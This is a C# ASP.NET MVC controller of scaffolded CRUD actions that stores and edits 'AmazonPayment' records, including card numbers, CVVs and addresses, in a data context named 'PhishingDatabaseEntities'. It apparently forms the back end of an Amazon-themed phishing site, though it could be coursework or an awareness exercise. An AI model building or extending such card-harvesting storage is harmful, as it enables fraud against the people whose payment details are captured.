using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class AmazonPaymentsController : Controller
    {
        private PhishingDatabaseEntities db = new PhishingDatabaseEntities();

        // GET: AmazonPayments
        public ActionResult Index()
        {
            var amazonPayment = db.AmazonPayment.Include(a => a.Receiver);
            return View(amazonPayment.ToList());
        }

        // GET: AmazonPayments/Details/5
        public ActionResult Details(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            AmazonPayment amazonPayment = db.AmazonPayment.Find(id);
            if (amazonPayment == null)
            {
                return HttpNotFound();
            }
            return View(amazonPayment);
        }

        // GET: AmazonPayments/Create
        public ActionResult Create()
        {
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID");
            return View();
        }

        // POST: AmazonPayments/Create
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Create([Bind(Include = "ID,Email,Address,City,State,ZipCode,CreditCardNumber,NameOnCard,Month,Year,CVV,DateEntered")] AmazonPayment amazonPayment)
        {
            if (ModelState.IsValid)
            {
                db.AmazonPayment.Add(amazonPayment);
                db.SaveChanges();
                return RedirectToAction("Index");
            }

            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", amazonPayment.ID);
            return View(amazonPayment);
        }

        // GET: AmazonPayments/Edit/5
        public ActionResult Edit(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            AmazonPayment amazonPayment = db.AmazonPayment.Find(id);
            if (amazonPayment == null)
            {
                return HttpNotFound();
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", amazonPayment.ID);
            return View(amazonPayment);
        }

        // POST: AmazonPayments/Edit/5
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Edit([Bind(Include = "ID,Email,Address,City,State,ZipCode,CreditCardNumber,NameOnCard,Month,Year,CVV,DateEntered")] AmazonPayment amazonPayment)
        {
            if (ModelState.IsValid)
            {
                db.Entry(amazonPayment).State = EntityState.Modified;
                db.SaveChanges();
                return RedirectToAction("Index");
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", amazonPayment.ID);
            return View(amazonPayment);
        }

        // GET: AmazonPayments/Delete/5
        public ActionResult Delete(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            AmazonPayment amazonPayment = db.AmazonPayment.Find(id);
            if (amazonPayment == null)
            {
                return HttpNotFound();
            }
            return View(amazonPayment);
        }

        // POST: AmazonPayments/Delete/5
        [HttpPost, ActionName("Delete")]
        [ValidateAntiForgeryToken]
        public ActionResult DeleteConfirmed(int id)
        {
            AmazonPayment amazonPayment = db.AmazonPayment.Find(id);
            db.AmazonPayment.Remove(amazonPayment);
            db.SaveChanges();
            return RedirectToAction("Index");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                db.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
